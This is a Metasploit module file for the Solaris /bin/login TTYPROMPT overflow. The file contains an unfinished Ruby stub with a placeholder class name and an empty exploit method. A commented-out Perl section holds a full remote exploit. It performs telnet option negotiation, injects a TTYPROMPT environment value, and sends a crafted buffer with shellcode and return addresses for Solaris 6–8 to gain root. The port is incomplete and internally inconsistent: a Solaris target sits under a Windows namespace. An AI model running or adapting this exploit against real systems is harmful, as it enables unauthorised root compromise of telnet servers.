require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Solaris /bin/login TTYPROMPT Overflow',
			'Description'    => %q{
				This is a msf port of optyx's /bin/login exploit.
					
			},
			'Author'         => [ 'Optyx <optyx <at> uberhax0r.net>', 'hdm' ],
			'License'        => BSD_LICENSE,
			'Version'        => '$Revision: 3637 $',
			'References'     =>
				[

				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 188,
					'BadChars' => "\x00",
				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'solaris',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => '',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::solaris_bin_login;
use base "Msf::Exploit";
use IO::Socket;
use IO::Select;
use strict;
use Pex::Text;

my $advanced = { };

my $info =
{
	'Name'  => 'Solaris /bin/login TTYPROMPT Overflow',
	'Version'  => '$Revision: 3637 $',
	'Authors' =>
	  [
		'Optyx <optyx <at> uberhax0r.net>',
		'H D Moore <hdm [at] metasploit.com>'
	  ],

	'Arch'  => [ 'sparc' ],
	'OS'    => [ 'solaris' ],
	'Priv'  => 1,

	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The telnet server port', 23],
	  },
	
	'Payload' =>
	  {
		'Space'      => 188,
		'BadChars'   => "\x00",
	  },

	'Description'  => Pex::Text::Freeform(qq{
		This is a msf port of optyx's /bin/login exploit.
}),
	
	'Refs'  =>
	  [

	  ],
	
	'Targets' =>
	  [
		["Solaris8", 0x28410, 0x284c8, 2, 6, 3],
		["Solaris7", 0x28228, 0x282dc, 3, 2, 2],
		["Solaris6", 0x281a0, 0x26dec, 3, 3, 1],
	  ],
	
	'Keys'  => ['broken'],
};

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_path = $self->GetVar('RPATH');

	my $shellcode   = $self->GetVar('EncodedPayload')->RawPayload;
	my $target_idx  = $self->GetVar('TARGET');
	my $target      = $self->Targets->[ $target_idx ];

	# double up any \xff to escape telnet mangling
	$shellcode =~ s/\xff/\xff\xff/g;

	print Pex::Text::BufferPerl($shellcode);

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );

	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	my ($res, $req);

	$res = $s->Recv(-1, 5);
	if (! $res) {
		$self->PrintLine("[*] The remote telnet server did not respond");
		$s->Close;
		return;
	}

	# Initial negotiation
	$req =
	  "\xff\xfd\x03". # Do suppress go ahead
	  "\xff\xfb\x18". # Will term type
	  "\xff\xfb\x1f". # Will negot win size
	  "\xff\xfb\x20". # Will term speed
	  "\xff\xfb\x21". # Will remote flow control
	  "\xff\xfb\x22". # Will linemode
	  "\xff\xfb\x27". # Will new env option
	  "\xff\xfd\x05". # Do status
	  "\xff\xfb\x23"; # Will X display
	$s->Send($req);
	$res .= $s->Recv(-1, 2);

	# Send over our window size
	$req =
	  "\xff\xfa\x1f".     # Negot win size
	  "\x00\x50\x00\x18". # 80x24
	  "\xff\xf0".         # End
	  "\xff\xfc\x24";     # Wont env option
	$s->Send($req);
	$res .= $s->Recv(-1, 2);

	# Send over the terminal type and evil TTYPROMPT
	$req =
	  "\xff\xfa\x18".     # Terminal type
	  "\x00xterm".        # 80x24
	  "\xff\xf0".         # End
	  "\xff\xfa\x23".     # Display location
	  "\x00where:0.0".        # 80x24
	  "\xff\xf0".         # End
	  "\xff\xfa\x27".     # New env option
	  "\x00\x00".
	  "DISPLAY\x01".
	  "where:0.0\x03".
	  "TTYPROMPT\x01".
	  "myzt3ry".
	  "\xff\xf0";          # End env option
	$s->Send($req);
	$res .= $s->Recv(-1, 2);

	# Enable remote echo
	$req =
	  "\xff\xfd\x01".     # Do echo
	  "\xff\xfc\x01";     # Wont echo
	$s->Send($req);
	$res .= $s->Recv(-1, 2);

	# Tell server to expect binary
	$req =
	  "\xff\xfb\x00";     # Binary transmission
	$s->Send($req);
	$res .= $s->Recv(-1, 2);

	# Overwrite the pam handler cleanup pointer
	$req =
	  "root ".
	  ("A" x $target->[3]).
	  $shellcode.
	  "\x00\x04".
	  ("A" x $target->[4]).
	  pack('N', $target->[1]).
	  ("A" x $target->[5]).
	  pack('N', $target->[1]).
	  " ".
	  "AA".
	  ("c " x 37).
	  "AAAA".
	  "\x04 ".
	  pack('N', $target->[2]).
	  ("AAA " x 45).
	  "\x04 ".
	  ("AAA " x 45).
	  "\x04 ".
	  ("AAA " x 34).
	  pack('N', $target->[2]).
	  "\xff\xfc\x00".
	  "\x04\x04";

	$self->PrintLine("[*] Sending final exploit request...");
	<>;

	$s->Send($req);
	$res = $s->Recv(-1, 20);
}

=end


end
end	
